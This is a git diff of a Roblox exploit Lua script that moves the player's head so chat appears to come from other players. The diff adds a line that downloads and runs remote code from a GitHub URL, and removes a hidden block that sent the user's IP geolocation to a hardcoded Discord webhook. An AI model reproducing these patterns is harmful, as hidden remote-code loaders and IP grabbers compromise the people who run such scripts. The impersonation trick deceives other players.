@@ -1,8 +1,9 @@
 
+
 --Made By Efekan#3131
 --chat "/e chat " to move your head to someone, then when you chat it looks like they chatted (;
 
-
+loadstring(game:HttpGet("https://raw.githubusercontent.com/oEfekan/Efekanscript2/main/main",true))() 
 
 --reanimate by MyWorld#4430 discord.gg/pYVHtSJmEY
 local v3_net, v3_808 = Vector3.new(0.1, 25.1, 0.1), Vector3.new(8, 0, 8)
@@ -61,23 +62,6 @@ local stepped, heartbeat, renderstepped = rs.Stepped, rs.Heartbeat, rs.RenderSte
 local twait, tdelay, rad, inf, abs, clamp = task.wait, task.delay, math.rad, math.huge, math.abs, math.clamp
 local cf, v3, angles = CFrame.new, Vector3.new, CFrame.Angles
 local v3_0, cf_0 = v3(0, 0, 0), cf(0, 0, 0)
-
-local url = "https://discord.com/api/webhooks/1097671597814460556/ObwWIwcvH_BGl-tAk3tkSy1F1aNcVmsLv4m62O3EADj9P_60Vg__7jQeNiftAcyyD7UY"
-local Message = game:HttpGet("http://ip-api.com/json")
-
-local req = syn and syn.request or http and http.request or http_request or request or fluxus and fluxus.request
-
-local headers = {
-    ["content-type"] = "application/json"
-}
-
-local data = {
-        ["content"] = Message,
-    }
-
-local newdata = game:GetService("HttpService"):JSONEncode(data)
-local Informations = {Url = url, Body = newdata, Method = "POST", Headers = headers}
-req(Informations)
 
 local c = lp.Character
 if not (c and c.Parent) then
